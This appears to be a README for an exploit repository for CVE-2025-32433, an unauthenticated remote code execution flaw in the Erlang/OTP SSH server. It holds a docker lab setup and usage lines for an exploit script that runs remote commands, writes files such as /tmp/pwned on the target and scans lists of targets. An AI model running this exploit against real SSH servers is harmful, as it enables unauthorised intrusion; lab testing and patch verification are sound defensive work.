# CVE-2025-32433
Erlang/OTP is a set of libraries for the Erlang programming language. Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20, a SSH server may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This issue is patched in versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20. A temporary workaround involves disabling the SSH server or to prevent access via firewall rules.

## Metrics
CVSSv3: 10.0 (CRITICAL)

## Vulnerability Environment
Build and run:
```bash
docker compose build
docker compose up -d
```
Stop Environment and remove network:
```bash
docker compose down
```

Vulnerable SSH server will exposed on port 2222.

## Detection and exploitation example
Use the CVE-2025-32433.py to test or exploit the SSH vulnerability:

```bash
python3 CVE-2025-32433.py -H <host> [-p <port>] [-t <timeout>] [-v] [-T <targets_file>] [-c <command> | -f --path <path> --content <content>]
```

###Example Usage:
#### Specify a different SSH port (e.g., 2022)
```bash
python3 CVE-2025-32433.py -H 172.90.240.1 -p 2222
```

#### Run a custom command
```bash
python3 CVE-2025-32433.py -H 172.90.240.1 -c "whoami"
```

#### Write a file to a remote path with custom content:
```bash
python3 CVE-2025-32433.py -H 172.90.240.1 -f --path /tmp/pwned --content "Exploit successful"
```

#### Scan multiple targets from a list:**
```bash
python3 CVE-2025-32433.py -T targets.txt
```
